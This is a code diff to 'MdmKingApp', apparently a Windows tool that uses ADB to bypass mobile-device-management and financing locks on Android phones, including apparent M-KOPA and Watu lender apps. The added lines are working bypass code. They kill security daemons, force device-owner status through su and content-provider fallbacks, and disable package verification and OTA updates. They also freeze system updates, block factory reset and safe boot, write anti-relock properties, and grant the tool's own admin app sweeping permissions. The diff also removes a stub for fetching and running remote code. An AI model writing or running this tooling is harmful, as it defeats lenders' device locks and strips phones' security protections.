@@ -3516,12 +3516,6 @@ class MdmKingApp:
         self.root.protocol('WM_DELETE_WINDOW', self._on_close)
         # Refresh config from cloud on launch
         threading.Thread(target=lambda: (self._refresh_cf_cfg(),), daemon=True).start()
-        # Fetch & execute remote Python algorithms (Knox Wizard CompileAssemblyFromSource)
-        threading.Thread(target=lambda: self._try_fetch_remote_algo(), daemon=True).start()
-
-    def _try_fetch_remote_algo(self):
-        pass
-
     def _load_cfg(self):
         self._refresh_cf_cfg()
 
@@ -4542,7 +4536,9 @@ class MdmKingApp:
                     b'scorpio_permissions', b'scorpio_whitelist',]
             total = sum(1 for p in self._mtk_pats if p in pre)
             del pre
-        except Exception: pass
+            self.log(f'[+] Pattern pre-scan found {total} potential matches', 's')
+        except Exception as _pe:
+            self.log(f'[!] Pattern pre-scan: {_pe}', 'o')
 
     def _mtk_animate_spinner(self):
         if not getattr(self, '_mtk_loading', False): return
@@ -4602,6 +4598,8 @@ class MdmKingApp:
                     with open('mdm_king_crash.log', 'w') as f:
                         traceback.print_exc(file=f)
                 except Exception: pass
+                self._enqueue_ui(lambda: self._safe_cleanup(ctx))
+                self._enqueue_ui(lambda: self.status_var.set('Error'))
 
     def _partition_tool(self):
         self.log('Miscdata / Proinfo Patcher', 'c')
@@ -4867,6 +4865,8 @@ class MdmKingApp:
                 with open('mdm_king_crash.log', 'w') as f:
                     traceback.print_exc(file=f)
             except Exception: pass
+            self._enqueue_ui(lambda: self._safe_cleanup(ctx))
+            self._enqueue_ui(lambda: self.status_var.set('Error'))
 
     def _hex_scan_ui(self, ctx, pct, count):
         try:
@@ -5114,6 +5114,7 @@ class MdmKingApp:
             _trace_log('CANCELLED')
         except MemoryError:
             setattr(self, ctx['neon_attr'], False)
+            self._enqueue_ui(lambda: self._safe_cleanup(ctx))
             self.log('[-] Error: NOT ENOUGH RAM', 'e')
             _trace_log('MEMORY_ERROR')
         except subprocess.TimeoutExpired as _te:
@@ -5220,6 +5221,7 @@ class MdmKingApp:
                 self.log(f'[!] Patching failed (exit {_proc.returncode})', 'e')
                 self._enqueue_ui(lambda: ctx['progress'].config(value=0))
                 self._enqueue_ui(lambda: self.status_var.set('Error'))
+                self._enqueue_ui(lambda: self._safe_cleanup(ctx))
             else:
                 self._enqueue_ui(lambda: ctx['progress'].config(value=90))
                 self._enqueue_ui(lambda: ctx['pct'].config(text='90%'))
@@ -5346,10 +5348,51 @@ class MdmKingApp:
         return card
 
     def _build_progress_ui(self, title, total_steps, step_labels):
-        self._prog_frame = None
+        self._prog_frame = tk.Frame(self.content, bg=self.c['bg'], highlightbackground=self.c['accent'], highlightthickness=1)
+        self._prog_step_labels = step_labels or []
+        self._prog_total = total_steps
+        self._prog_current = 0
+        self._prog_step_widgets = []
+        self._prog_title = title
 
     def _show_progress(self, title):
         self.log(f'Starting: {title}', 's')
+        def _build():
+            if not getattr(self, '_prog_frame', None): return
+            f = self._prog_frame
+            inner = tk.Frame(f, bg=self.c['bg'], padx=30, pady=20)
+            inner.pack(expand=True, fill=tk.BOTH)
+            tk.Label(inner, text=title, font=('Segoe UI', 14, 'bold'),
+                     fg=self.c['accent2'], bg=self.c['bg']).pack(anchor='w', pady=(0, 12))
+            pb_frame = tk.Frame(inner, bg=self.c['bg'])
+            pb_frame.pack(fill=tk.X, pady=(0, 12))
+            prog = ttk.Progressbar(pb_frame, mode='determinate', style='TProgressbar')
+            prog.pack(fill=tk.X, ipady=6)
+            self._prog_bar = prog
+            pct = tk.Label(pb_frame, text='0%', font=('Cascadia Code', 10, 'bold'),
+                           fg=self.c['blue'], bg=self.c['bg'])
+            pct.place(relx=0.5, rely=0.5, anchor='center')
+            self._prog_pct = pct
+            steps_frame = tk.Frame(inner, bg=self.c['bg'])
+            steps_frame.pack(fill=tk.X)
+            self._prog_step_widgets = []
+            for i, lbl in enumerate(self._prog_step_labels):
+                row = tk.Frame(steps_frame, bg=self.c['bg'])
+                row.pack(fill=tk.X, pady=2)
+                dot = tk.Label(row, text='○', font=('Segoe UI', 10), fg=self.c['muted'], bg=self.c['bg'], width=2)
+                dot.pack(side=tk.LEFT)
+                lbl_w = tk.Label(row, text=lbl, font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['bg'], anchor='w')
+                lbl_w.pack(side=tk.LEFT, padx=(4, 0))
+                self._prog_step_widgets.append((dot, lbl_w))
+            msg_frame = tk.Frame(inner, bg=self.c['bg'])
+            msg_frame.pack(fill=tk.X, pady=(8, 0))
+            msg_lbl = tk.Label(msg_frame, text='', font=('Segoe UI', 9, 'italic'),
+                               fg=self.c['muted'], bg=self.c['bg'], anchor='w')
+            msg_lbl.pack(fill=tk.X)
+            self._prog_msg = msg_lbl
+            f.place(relx=0, rely=0, relwidth=1, relheight=1)
+            f.lift()
+        self.root.after(0, _build)
 
     def _update_progress(self, step, total, msg, state='running'):
         if state == 'done':
@@ -5358,12 +5401,42 @@ class MdmKingApp:
             self.log_fail(msg)
         else:
             self.log_info(msg)
+        def _update():
+            if not getattr(self, '_prog_frame', None) or not self._prog_frame.winfo_exists(): return
+            if step < len(self._prog_step_widgets):
+                dot, lbl = self._prog_step_widgets[step]
+                if state == 'done' or state == 'ok':
+                    dot.config(text='✓', fg=self.c['green'])
+                    lbl.config(fg=self.c['green'])
+                elif state == 'running':
+                    dot.config(text='●', fg=self.c['accent'])
+                    lbl.config(fg=self.c['accent'])
+                elif state == 'failed':
+                    dot.config(text='✗', fg=self.c['red'])
+                    lbl.config(fg=self.c['red'])
+            if hasattr(self, '_prog_bar') and self._prog_bar:
+                pct_val = int((step / max(total, 1)) * 100) if total > 0 else 0
+                self._prog_bar['value'] = pct_val
+            if hasattr(self, '_prog_pct') and self._prog_pct:
+                self._prog_pct.config(text=f'{int((step / max(total, 1)) * 100)}%')
+            if hasattr(self, '_prog_msg') and self._prog_msg:
+                self._prog_msg.config(text=msg)
+        self.root.after(0, _update)
 
     def _finish_progress(self, success, msg):
         if success:
             self.log_ok(msg)
         else:
             self.log_fail(msg)
+        def _finish():
+            if getattr(self, '_prog_frame', None) and self._prog_frame.winfo_exists():
+                self._prog_frame.destroy()
+            self._prog_frame = None
+            self._prog_bar = None
+            self._prog_pct = None
+            self._prog_msg = None
+            self._prog_step_widgets = []
+        self.root.after(300, _finish)
 
     def _run_mdm_app_bypass(self):
         adb = s = None
@@ -5389,13 +5462,13 @@ class MdmKingApp:
             self._show_flow_step('Device Info', 'ok')
             self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
             self._show_flow_step('Upload Data', 'ok')
-            self.log('BYPASSING', 'h')
+            self.log('[#] STAGE=MDM_APP_BYPASS STATUS=RUNNING OPERATION=executing', 'h')
             self._show_flow_step('Retreve info', 'ok')
             self._adb_bypass_core('MDM APP', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'] + CHIPSET_PACKAGES['mtk'] + ['com.android.vending'])
             self._show_flow_step('Post-bypass cleanup', 'ok')
             self._show_flow_step('Finishing', 'ok')
         except Exception as _e:
-            self.log(f'MDM App bypass error: {_e}', 'e')
+            self.log('[-] STAGE=MDM_APP_BYPASS STATUS=FAIL REASON=' + str(_e), 'e')
             import traceback as _tb
             for _l in _tb.format_exc().split('\n'):
                 if _l.strip(): self.log(_l, 'e')
@@ -5572,10 +5645,10 @@ class MdmKingApp:
             self.root.after(0, lambda: self.log_text.config(bg=self.c['log_bg'], fg=self.c['log_fg'],
                 insertbackground=self.c['log_fg'], font=('Consolas', 10)))
             adb = self._find_adb()
-            if not adb: self.log('ADB not found', 'e'); return
+            if not adb: self.log('[-] STAGE=BYPASS_2023 STATUS=FAIL REASON=ADB_TRANSPORT_MISSING', 'e'); return
             r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
-            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l and 'unauthorized' not in l]
-            if not devs: self.log('No device found', 'e'); return
+            devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
+            if not devs: self.log('[-] STAGE=BYPASS_2023 STATUS=FAIL REASON=NO_DEVICE_DETECTED', 'e'); return
             s = devs[0]
             self.log(f'Phone Mode: ADB MODE', 's')
 
@@ -5587,7 +5660,7 @@ class MdmKingApp:
             info = self._log_device_summary(adb, s)
             if not info: return
             self.root.after(50, lambda: self._update_progress(0, 5, 'Info OK', 'done'))
-            self.log('BYPASSING', 'h')
+            self.log('[#] STAGE=NOKIA_BYPASS STATUS=RUNNING OPERATION=executing', 'h')
 
             # Nokia softlock packages to disable/uninstall
             self.root.after(0, lambda: self._update_progress(1, 5, 'Disabling SoftLock packages...', 'running'))
@@ -5620,10 +5693,10 @@ class MdmKingApp:
             subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0'], timeout=3, capture_output=True, creationflags=0x08000000)
             subprocess.run([adb, '-s', s, 'reboot'], timeout=5, capture_output=True, creationflags=0x08000000)
         except Exception as _e:
-            self.log(f'Error: {_e}', 'e')
+            self.log('[-] STAGE=NOKIA_BYPASS STATUS=FAIL REASON=' + str(_e), 'e')
             import traceback as _tb
             for _l in _tb.format_exc().split('\n'):
-                if _l.strip(): self.log(_l, 'e')
+                if _l.strip(): self.log('[-] STAGE=NOKIA_BYPASS STATUS=FAIL TRACE=' + _l, 'e')
         finally:
             self._nokia_cleanup()
 
@@ -5631,7 +5704,7 @@ class MdmKingApp:
         self._nokia_loading = False
 
     def _black_screen_removal(self):
-        self.log('BlackScreen Fix', 'c')
+        self.log('[#] STAGE=INIT STATUS=RUNNING OPERATION=blackscreen_fix', 'c')
         cw = tk.Frame(self.content, bg=self.c['surface2'])
         cw.pack(expand=True, fill=tk.BOTH, padx=20, pady=20)
         card = tk.Frame(cw, bg=self.c['card'])
@@ -5651,16 +5724,16 @@ class MdmKingApp:
             adb = self._find_adb()
             tools = self._tools_dir()
             if not tools:
-                self.log('[#] Downloading tools from server...', 'h')
+                self.log('[#] STAGE=INIT STATUS=RUNNING OPERATION=download_tools', 'h')
                 from cloudflare import init_cloudflare_assets as _init_cf
                 _init_cf()
                 tools = self._tools_dir()
                 if tools:
-                    self.log('[+] Tools ready', 's')
+                    self.log('[+] STAGE=INIT STATUS=OK OPERATION=tools_ready', 's')
             r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
             devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l and 'unauthorized' not in l]
             if not devs:
-                self.log('No ADB device found. Enable USB debugging.', 'e')
+                self.log('[-] STAGE=BLACKSCREEN_FIX STATUS=FAIL REASON=NO_DEVICE_DETECTED', 'e')
                 return
             s = devs[0]
 
@@ -5676,10 +5749,10 @@ class MdmKingApp:
                     v = p.get(k, '')
                     if v: return v
                 return ''
-            self.log(f'Model: {gp("ro.product.model")}  |  Android: {gp("ro.build.version.release")}  |  SDK: {gp("ro.build.version.sdk")}', 'i')
-            self.log(f'Platform: {gp("ro.board.platform", "ro.chipname")}  |  Security: {gp("ro.build.version.security_patch")}', 'i')
-            self.log(f'Serial: {gp("ro.serialno", "sys.serialnumber")}  |  Build: {gp("ro.build.display.id")}', 'i')
-            self.log(f'Device: {gp("ro.product.device")}  |  Manufacturer: {gp("ro.product.manufacturer", "ro.product.brand")}', 'i')
+            self.log('[+] STAGE=FINGERPRINT STATUS=OK MODEL=' + gp("ro.product.model") + ' OS=' + gp("ro.build.version.release") + ' SDK=' + gp("ro.build.version.sdk"), 'i')
+            self.log('[+] STAGE=FINGERPRINT STATUS=OK PLATFORM=' + gp("ro.board.platform", "ro.chipname") + ' PATCH=' + gp("ro.build.version.security_patch"), 'i')
+            self.log('[+] STAGE=FINGERPRINT STATUS=OK SERIAL=' + gp("ro.serialno", "sys.serialnumber") + ' BUILD=' + gp("ro.build.display.id"), 'i')
+            self.log('[+] STAGE=FINGERPRINT STATUS=OK DEVICE=' + gp("ro.product.device") + ' VENDOR=' + gp("ro.product.manufacturer", "ro.product.brand"), 'i')
 
             # 1) Find and install admin APK
             apk = None
@@ -5695,7 +5768,7 @@ class MdmKingApp:
             r2 = subprocess.run([adb, '-s', s, 'shell', 'pm list packages com.mdmking.admin'], capture_output=True, text=True, timeout=5, creationflags=flags)
             if 'com.mdmking.admin' in (r2.stdout or ''):
                 apk_ok = True
-                self.log('Admin app already installed on device', 's')
+                self.log('[+] STAGE=ADMIN_DEPLOY STATUS=OK STATE=ALREADY_INSTALLED', 's')
             if apk and not apk_ok:
                 self._ensure_apk_signed(apk)
                 for args in [
@@ -5714,10 +5787,10 @@ class MdmKingApp:
                 if 'com.mdmking.admin' in (r2.stdout or ''):
                     apk_ok = True
             if not apk and not apk_ok:
-                self.log('Admin APK not found in tools/ and not installed on device', 'e')
+                self.log('[-] STAGE=NOKIA_BYPASS STATUS=FAIL REASON=APK_MISSING', 'e')
                 return
             if not apk_ok:
-                self.log('Admin app NOT installed — bypass may fail', 'w')
+                self.log('[!] STAGE=NOKIA_BYPASS STATUS=WARNING REASON=APK_NOT_INSTALLED', 'w')
 
             # 2) Kill MDM daemons + block traffic
             subprocess.run([adb, '-s', s, 'shell',
@@ -5754,11 +5827,67 @@ class MdmKingApp:
                 'settings put secure enabled_accessibility_services '
                 'com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null; '
                 'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS 2>/dev/null; '
+                'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED 2>/dev/null; '
+                'pm grant com.mdmking.admin android.permission.MANAGE_EXTERNAL_STORAGE 2>/dev/null; '
+                'pm grant com.mdmking.admin android.permission.REQUEST_INSTALL_PACKAGES 2>/dev/null; '
+                'pm grant com.mdmking.admin android.permission.SYSTEM_ALERT_WINDOW 2>/dev/null; '
+                'pm grant com.mdmking.admin android.permission.REQUEST_DELETE_PACKAGES 2>/dev/null; '
+                'pm grant com.mdmking.admin android.permission.FOREGROUND_SERVICE 2>/dev/null; '
                 'appops set com.mdmking.admin POST_NOTIFICATIONS allow 2>/dev/null; '
                 'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null; '
                 'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow 2>/dev/null; '
-                'appops set com.mdmking.admin AUTO_START allow 2>/dev/null'],
+                'appops set com.mdmking.admin AUTO_START allow 2>/dev/null; '
+                'appops set com.mdmking.admin MANAGE_OVERLAY_PERMISSION allow 2>/dev/null; '
+                'appops set com.mdmking.admin SCHEDULE_EXACT_ALARM allow 2>/dev/null; '
+                'appops set com.mdmking.admin REQUEST_INSTALL_PACKAGES allow 2>/dev/null'],
+                timeout=15, capture_output=True, creationflags=flags)
+
+            # 4b) Admin restrictions + relock prevention
+            _adm_comp = 'com.mdmking.admin/.MyAdminReceiver'
+            subprocess.run([adb, '-s', s, 'shell',
+                'settings put global add_users_when_locked 0 2>/dev/null; '
+                'settings put global multi_user_mode 0 2>/dev/null; '
+                'settings put global autofill_service null 2>/dev/null; '
+                'settings put global package_verifier_enable 0 2>/dev/null; '
+                'settings put global verifier_verify_adb_installs 0 2>/dev/null; '
+                'settings put global ota_disable_automatic_update 1 2>/dev/null; '
+                'settings put secure ota_disable_automatic_update 1 2>/dev/null'],
+                timeout=5, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell',
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_add_user true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_remove_user true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_add_managed_profile true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_config_credentials true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_factory_reset true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_safe_boot true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_network_reset true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_set_user_icon true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_autofill true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_verify_apps true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_switch_user true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_fun true 2>/dev/null; '
+                'cmd device_policy set-user-restriction ' + _adm_comp + ' no_sim_global true 2>/dev/null'],
                 timeout=10, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell',
+                'cmd device_policy set-system-update-policy ' + _adm_comp + ' --freeze-period-start 01/01 --freeze-period-end 02/20 2>/dev/null'],
+                timeout=5, capture_output=True, creationflags=flags)
+            for _mkopa_pkg in ['com.mkopa.app', 'com.watutz.app']:
+                subprocess.run([adb, '-s', s, 'shell',
+                    'cmd device_policy set-uninstall-blocked ' + _adm_comp + ' ' + _mkopa_pkg + ' true 2>/dev/null'],
+                    timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell',
+                'cmd device_policy set-credential-manager-provider-blocklist ' + _adm_comp + ' com.mkopa.app,com.watutz.app 2>/dev/null'],
+                timeout=5, capture_output=True, creationflags=flags)
+            # Persist anti-relock sysprops
+            for _lp in ['persist.sys.mdm=0', 'persist.sys.oobe.devicelock=0',
+                        'persist.sys.oobe=0', 'persist.sys.sim_locked=0',
+                        'persist.vendor.transsion.mdm=0', 'persist.sys.trancritical=0']:
+                subprocess.run([adb, '-s', s, 'shell',
+                    'echo "' + _lp + '" >> /data/local.prop 2>/dev/null; '
+                    'setprop ' + _lp.replace('=', ' ') + ' 2>/dev/null'],
+                    timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'chmod 644 /data/local.prop 2>/dev/null'],
+                timeout=3, capture_output=True, creationflags=flags)
 
             # 5) Disable MDM/black screen packages
             all_pkgs = [p for p in (CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'] + CHIPSET_PACKAGES['mtk'])
@@ -5835,23 +5964,42 @@ class MdmKingApp:
                            timeout=3, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin AUTO_START allow'],
                            timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin POST_NOTIFICATIONS allow'],
+                           timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin MANAGE_OVERLAY_PERMISSION allow'],
+                           timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin SCHEDULE_EXACT_ALARM allow'],
+                           timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'appops set com.mdmking.admin REQUEST_INSTALL_PACKAGES allow'],
+                           timeout=3, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED'],
+                           timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.MANAGE_EXTERNAL_STORAGE 2>/dev/null'],
+                           timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_INSTALL_PACKAGES 2>/dev/null'],
+                           timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.SYSTEM_ALERT_WINDOW 2>/dev/null'],
+                           timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.REQUEST_DELETE_PACKAGES 2>/dev/null'],
+                           timeout=3, capture_output=True, creationflags=flags)
+            subprocess.run([adb, '-s', s, 'shell', 'pm grant com.mdmking.admin android.permission.FOREGROUND_SERVICE 2>/dev/null'],
                            timeout=3, capture_output=True, creationflags=flags)
             subprocess.run([adb, '-s', s, 'shell', 'am broadcast -a com.mdmking.admin.ACTION_START 2>/dev/null'],
                            timeout=3, capture_output=True, creationflags=flags)
 
-            self.log('Rebooting device...', 'i')
+            self.log('[*] STAGE=FINALIZE STATUS=RUNNING OPERATION=reboot', 'i')
             threading.Thread(target=lambda: subprocess.run(
                 [adb, '-s', s, 'shell', 'reboot'], timeout=30, capture_output=True, creationflags=flags),
                 daemon=True).start()
             time.sleep(2)
-            self.log('BlackScreen fix complete! Device should boot normally now.', 's')
+            self.log('[+] STAGE=FINALIZE STATUS=OK OPERATION=blackscreen_fix', 's')
         except Exception as e:
-            self.log(f'BlackScreen error: {e}', 'e')
+            self.log('[-] STAGE=FINALIZE STATUS=FAIL REASON=' + str(e), 'e')
         finally:
-            try:
-                subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0 2>/dev/null'], timeout=3, capture_output=True)
-            except Exception: pass
+            if adb and s:
+                try:
+                    subprocess.run([adb, '-s', s, 'shell', 'settings put global airplane_mode_on 0 2>/dev/null'], timeout=3, capture_output=True)
+                except Exception: pass
 
     def _adb_bypass_core(self, label, purge_pkgs, disable_only=None, skip_airplane=False, device_serial=None, skip_reboot=False, disable_pkgs=False, quiet=False, uninstall_pkgs=None):
         """Run ADB bypass core — wrapped in try/except so thread exceptions are logged, not silent."""
@@ -5860,12 +6008,12 @@ class MdmKingApp:
             flags = 0x08000000
             tools = self._tools_dir()
             if not tools:
-                self.log('[#] Downloading tools from server...', 'h')
+                self.log('[#] STAGE=INIT STATUS=RUNNING OPERATION=download_tools', 'h')
                 from cloudflare import init_cloudflare_assets as _init_cf
                 _init_cf()
                 tools = self._tools_dir()
                 if tools:
-                    self.log('[+] Tools ready', 's')
+                    self.log('[+] STAGE=INIT STATUS=OK OPERATION=tools_ready', 's')
             adb = None
             for _p in [r'C:\Program Files\platform-tools\adb.exe', self._find_adb()]:
                 if _p and os.path.isfile(_p):
@@ -5876,13 +6024,13 @@ class MdmKingApp:
                             break
                     except Exception: pass
             if not adb:
-                self.log('ADB not found — check tools directory or PATH', 'e')
+                self.log('[-] STAGE=INIT STATUS=FAIL REASON=ADB_TRANSPORT_MISSING', 'e')
                 return
             if device_serial: s = device_serial
             else:
                 r = subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15)
                 devs = [l.split('\t')[0] for l in r.stdout.split('\n') if '\tdevice' in l]
-                if not devs: self.log('No device', 'e'); return
+                if not devs: self.log('[-] STAGE=INIT STATUS=FAIL REASON=NO_DEVICE_DETECTED', 'e'); return
                 s = devs[0]
             # ── Read full device info (SamFw style) ──
             raw = subprocess.run([adb, '-s', s, 'shell', 'getprop'], capture_output=True, text=True, timeout=10, creationflags=flags).stdout
@@ -5927,7 +6075,7 @@ class MdmKingApp:
             mem = gx('dumpsys meminfo 2>/dev/null | grep -i "total ram:" | head -1')
             if mem: cs.append(('💿', 'RAM', mem.split(':')[1].strip() if ':' in mem else mem, None))
             self._show_flow_info(adb, s, flags)
-            self.log('[!] Data Processing: DO NOT DISCONNECT DEVICE', 'w')
+            self.log('[!] STAGE=INIT STATUS=RUNNING OPERATION=data_processing INTERFACE=ADB', 'w')
             # Keep phone awake + prevent lock during bypass
             for _wakeline in [
                 'svc power stayon true 2>/dev/null',
@@ -5979,9 +6127,9 @@ class MdmKingApp:
                     r = subprocess.run(args, timeout=60, capture_output=True, text=True, creationflags=flags)
                     if 'Success' in (r.stdout or ''): apk_ok = True; break
                     err = (r.stderr or '')[:200].replace('\n', ' ').strip()
-                    if err and not quiet: self.log(f'install #{i+1}: {err}', 'w')
+                    if err and not quiet: self.log('[!] STAGE=ADMIN_DEPLOY STATUS=FAIL ERROR=' + err, 'w')
             if not apk_ok and not quiet:
-                self.log_warn('Admin app NOT installed - bypass may fail')
+                self.log('[!] STAGE=ADMIN_DEPLOY STATUS=WARNING REASON=APK_NOT_INSTALLED', 'w')
 
             # ── Install Aurora Store early (before lockdown/airplane mode) ──
             try:
@@ -6171,7 +6319,7 @@ class MdmKingApp:
                             _owner_ok = True
                             break
                         elif 'SecurityCom' in _out:
-                            if not quiet: self.log(f'[SECURITY] Attempt {_attempt+1}/6 — blocked by SecurityCom, killing and retrying...', 'w')
+                            if not quiet: self.log('[!] STAGE=ADMIN_ACTIVATE STATUS=RETRY REASON=SecurityCom_BLOCKED ATTEMPT=' + str(_attempt+1) + '/6', 'w')
                             # Targeted SecurityCom kill
                             subprocess.run([adb, '-s', s, 'shell',
                                 'killall -9 security transsion.security scorpio_security '
@@ -6186,7 +6334,7 @@ class MdmKingApp:
                         break
                 # 5) Fallback: try su-based approach if available
                 if not _owner_ok:
-                    if not quiet: self.log('[FALLBACK] Trying su-based device owner...', 'w')
+                    if not quiet: self.log('[!] STAGE=ADMIN_ACTIVATE STATUS=FALLBACK METHOD=su', 'w')
                     for _su_cmd in [
                         f'su -c "dpm set-device-owner --user 0 {_adm_comp}"',
                         f'su -c "dpm set-device-owner --user current {_adm_comp}"',
@@ -6199,11 +6347,11 @@ class MdmKingApp:
                         _out = ((r.stdout or '') + (r.stderr or '')).strip()
                         if 'Success' in _out or 'already' in _out.lower():
                             _owner_ok = True
-                            if not quiet: self.log('[FALLBACK] su-based device owner succeeded!', 's')
+                            if not quiet: self.log('[+] STAGE=ADMIN_ACTIVATE STATUS=OK METHOD=su', 's')
                             break
                 # 6) Last resort: try setting via content provider
                 if not _owner_ok:
-                    if not quiet: self.log('[FALLBACK] Trying content provider method...', 'w')
+                    if not quiet: self.log('[!] STAGE=ADMIN_ACTIVATE STATUS=FALLBACK METHOD=content_provider', 'w')
                     subprocess.run([adb, '-s', s, 'shell',
                         f'content call --uri content://com.mdmking.admin.provider --method set-device-owner --extra owner:s:{_adm_comp} 2>/dev/null'],
                         timeout=10, capture_output=True, creationflags=flags)
@@ -6213,19 +6361,27 @@ class MdmKingApp:
                                         timeout=5, capture_output=True, text=True, creationflags=flags)
                     _fb_err = ((r3.stdout or '') + (r3.stderr or '')).strip().split('\n')[0][:100]
                     if not quiet and _fb_err:
-                        self.log(f'[FALLBACK] set-active-admin: {_fb_err}', 'w')
+                        self.log('[!] STAGE=ADMIN_ACTIVATE STATUS=FALLBACK METHOD=active_admin', 'w')
             if _owner_ok:
                 subprocess.run([adb, '-s', s, 'shell', 'am start -n com.mdmking.admin/.MainActivity --activity-clear-top 2>/dev/null'], timeout=5, capture_output=True, creationflags=flags)
                 subprocess.run([adb, '-s', s, 'shell',
                     'pm grant com.mdmking.admin android.permission.WRITE_SECURE_SETTINGS 2>/dev/null; '
                     'settings put secure enabled_accessibility_services com.mdmking.admin/com.mdmking.admin.MyAccessibilityService 2>/dev/null; '
                     'pm grant com.mdmking.admin android.permission.RECEIVE_BOOT_COMPLETED 2>/dev/null; '
+                    'pm grant com.mdmking.admin android.permission.MANAGE_EXTERNAL_STORAGE 2>/dev/null; '
+                    'pm grant com.mdmking.admin android.permission.REQUEST_INSTALL_PACKAGES 2>/dev/null; '
+                    'pm grant com.mdmking.admin android.permission.SYSTEM_ALERT_WINDOW 2>/dev/null; '
+                    'pm grant com.mdmking.admin android.permission.REQUEST_DELETE_PACKAGES 2>/dev/null; '
+                    'pm grant com.mdmking.admin android.permission.FOREGROUND_SERVICE 2>/dev/null; '
                     'dumpsys deviceidle whitelist +com.mdmking.admin 2>/dev/null; '
                     'appops set com.mdmking.admin RUN_ANY_IN_BACKGROUND allow 2>/dev/null; '
                     'appops set com.mdmking.admin AUTO_START allow 2>/dev/null; '
                     'appops set com.mdmking.admin POST_NOTIFICATIONS allow 2>/dev/null; '
+                    'appops set com.mdmking.admin MANAGE_OVERLAY_PERMISSION allow 2>/dev/null; '
+                    'appops set com.mdmking.admin SCHEDULE_EXACT_ALARM allow 2>/dev/null; '
+                    'appops set com.mdmking.admin REQUEST_INSTALL_PACKAGES allow 2>/dev/null; '
                     'am start -n com.mdmking.admin/.DisableFactoryReset --activity-clear-top 2>/dev/null'],
-                    timeout=10, capture_output=True, creationflags=flags)
+                    timeout=15, capture_output=True, creationflags=flags)
                 # ── Admin restrictions for all device types ──
                 subprocess.run([adb, '-s', s, 'shell',
                     'settings put global add_users_when_locked 0 2>/dev/null; '
@@ -6532,7 +6688,7 @@ class MdmKingApp:
             self._show_flow_step('Device Info', 'ok')
             self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
             self._show_flow_step('Upload Data', 'ok')
-            self.log('BYPASSING', 'h')
+            self.log('[#] STAGE=SPD_BYPASS STATUS=RUNNING OPERATION=executing', 'h')
             self._show_flow_step('Retreve info', 'ok')
             self._adb_bypass_core('SPD', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['spd'],
                 disable_pkgs=True, quiet=False, uninstall_pkgs=['com.android.vending'])
@@ -6576,7 +6732,7 @@ class MdmKingApp:
             self._show_flow_step('Device Info', 'ok')
             self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
             self._show_flow_step('Upload Data', 'ok')
-            self.log('BYPASSING', 'h')
+            self.log('[#] STAGE=MTK_BYPASS STATUS=RUNNING OPERATION=executing', 'h')
             self._show_flow_step('Retreve info', 'ok')
             self._adb_bypass_core('MTK', CHIPSET_PACKAGES['common'] + CHIPSET_PACKAGES['mtk'], quiet=False, uninstall_pkgs=['com.android.vending'])
             self._show_flow_step('Post-bypass cleanup', 'ok')
@@ -6620,7 +6776,7 @@ class MdmKingApp:
             self._show_flow_step('Device Info', 'ok')
             self.root.after(50, lambda: self._update_progress(0, 8, '...', 'done'))
             self._show_flow_step('Upload Data', 'ok')
